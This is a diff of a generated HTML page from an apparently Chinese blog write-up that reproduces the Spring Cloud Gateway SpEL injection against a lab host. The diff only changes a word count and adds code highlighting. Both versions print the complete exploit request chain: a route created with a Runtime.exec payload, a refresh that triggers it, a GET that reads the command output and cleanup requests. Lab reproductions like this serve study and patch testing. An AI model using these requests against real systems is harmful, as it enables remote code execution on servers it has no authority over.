@@ -485,7 +485,7 @@ Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（�
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    548
+                    532
                 </div>
                 
 
@@ -521,70 +521,70 @@ docker-compose up -d
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开<code>http://192.168.3.151:8080</code></p>
 <p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507140704246.png" alt="image-20220507140704246"></p>
 <p>构造恶意伪造数据包</p>
-<pre><code>POST /actuator/gateway/routes/hacktest HTTP/1.1
+<pre class=" language-bash"><code class="language-bash">POST /actuator/gateway/routes/hacktest HTTP/1.1
 Host: 192.168.3.151:8080
 Accept-Encoding: gzip, deflate
 Accept: */*
 Accept-Language: en
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36
 Connection: close
 Content-Type: application/json
 Content-Length: 329
 
-&#123;
-  &quot;id&quot;: &quot;hacktest&quot;,
-  &quot;filters&quot;: [&#123;
-    &quot;name&quot;: &quot;AddResponseHeader&quot;,
-    &quot;args&quot;: &#123;
-      &quot;name&quot;: &quot;Result&quot;,
-      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;
-    &#125;
-  &#125;],
-  &quot;uri&quot;: &quot;http://example.com&quot;
-&#125;
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+  <span class="token string">"id"</span><span class="token keyword">:</span> <span class="token string">"hacktest"</span>,
+  <span class="token string">"filters"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"AddResponseHeader"</span>,
+    <span class="token string">"args"</span><span class="token keyword">:</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+      <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"Result"</span>,
+      <span class="token string">"value"</span><span class="token keyword">:</span> <span class="token string">"#&amp;#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&amp;#123;\"id\"&amp;#125;).getInputStream()))&amp;#125;"</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;],</span>
+  <span class="token string">"uri"</span><span class="token keyword">:</span> <span class="token string">"http://example.com"</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
 </code></pre>
 <p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141227943.png" alt="image-20220507141227943"></p>
 <p>用刚添加的路由发送如下数据包，此数据包会触发表达式执行</p>
-<pre><code>POST /actuator/gateway/refresh HTTP/1.1
+<pre class=" language-bash"><code class="language-bash">POST /actuator/gateway/refresh HTTP/1.1
 Host: 192.168.3.151:8080
 Accept-Encoding: gzip, deflate
 Accept: */*
 Accept-Language: en
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 </code></pre>
 <p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141839633.png" alt="image-20220507141839633"></p>
 <p>构造数据包查看结果</p>
-<pre><code>GET /actuator/gateway/routes/hacktest HTTP/1.1
+<pre class=" language-bash"><code class="language-bash">GET /actuator/gateway/routes/hacktest HTTP/1.1
 Host: 192.168.3.151:8080
 Accept-Encoding: gzip, deflate
 Accept: */*
 Accept-Language: en
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 2
 </code></pre>
 <p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141932420.png" alt="image-20220507141932420"></p>
 <p>结束后删除路由</p>
-<pre><code>DELETE /actuator/gateway/routes/hacktest HTTP/1.1
+<pre class=" language-bash"><code class="language-bash">DELETE /actuator/gateway/routes/hacktest HTTP/1.1
 Host: 192.168.3.151:8080
 Accept-Encoding: gzip, deflate
 Accept: */*
 Accept-Language: en
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36
 Connection: close
 </code></pre>
 <p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507142054696.png" alt="image-20220507142054696"></p>
 <p>最后在刷新</p>
-<pre><code>POST /actuator/gateway/refresh HTTP/1.1
+<pre class=" language-bash"><code class="language-bash">POST /actuator/gateway/refresh HTTP/1.1
 Host: 192.168.3.151:8080
 Accept-Encoding: gzip, deflate
 Accept: */*
 Accept-Language: en
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
